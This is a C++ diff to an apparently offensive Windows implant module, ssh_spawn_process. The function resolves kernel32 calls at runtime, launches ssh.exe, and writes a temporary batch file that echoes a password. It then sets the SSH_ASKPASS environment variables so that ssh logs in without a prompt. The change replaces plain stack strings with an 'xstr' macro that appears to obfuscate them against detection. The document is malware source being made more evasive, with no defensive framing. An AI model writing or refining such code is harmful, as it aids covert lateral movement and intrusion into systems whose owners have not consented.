@@ -31,7 +31,7 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
     inst.kernel32.SetHandleInformation( h_stdout_read, HANDLE_FLAG_INHERIT, 0 );
 
     char cmdline[1024] = {};
-    char ssh_path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\','S','y','s','t','e','m','3','2','\\','O','p','e','n','S','S','H','\\','s','s','h','.','e','x','e', 0 };
+    xstr(ssh_path, "C:\\Windows\\System32\\OpenSSH\\ssh.exe");
 
     char* p = cmdline;
     auto append = [&p]( const char* s ) { while ( *s ) *p++ = *s++; };
@@ -59,7 +59,7 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
     char temp_dir[MAX_PATH] = {};
     inst.kernel32.GetTempPathA( MAX_PATH, temp_dir );
 
-    char askpass_name[] = { 's','b','_','a','p','.','c','m','d', 0 };
+    xstr(askpass_name, "sb_ap.cmd");
     char* dp = askpass_path;
     char* sp = temp_dir;
     while ( *sp ) *dp++ = *sp++;
@@ -71,7 +71,7 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
         askpass_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
     );
     if ( h_askpass != INVALID_HANDLE_VALUE ) {
-        char prefix[] = { '@','e','c','h','o',' ','o','f','f','\r','\n','e','c','h','o',' ', 0 };
+        xstr(prefix, "@echo off\r\necho ");
         DWORD written;
         inst.kernel32.WriteFile( h_askpass, prefix, 16, &written, NULL );
         uint32_t pw_len = 0;
@@ -80,11 +80,11 @@ static auto declfn ssh_spawn_process( instance& inst ) -> bool {
         inst.kernel32.CloseHandle( h_askpass );
     }
 
-    char env_askpass[] = { 'S','S','H','_','A','S','K','P','A','S','S', 0 };
-    char env_require[] = { 'S','S','H','_','A','S','K','P','A','S','S','_','R','E','Q','U','I','R','E', 0 };
-    char env_display[] = { 'D','I','S','P','L','A','Y', 0 };
-    char val_force[]   = { 'f','o','r','c','e', 0 };
-    char val_display[] = { 'l','o','c','a','l','h','o','s','t',':','0', 0 };
+    xstr(env_askpass, "SSH_ASKPASS");
+    xstr(env_require, "SSH_ASKPASS_REQUIRE");
+    xstr(env_display, "DISPLAY");
+    xstr(val_force, "force");
+    xstr(val_display, "localhost:0");
 
     inst.kernel32.SetEnvironmentVariableA( env_askpass, askpass_path );
     inst.kernel32.SetEnvironmentVariableA( env_require, val_force );
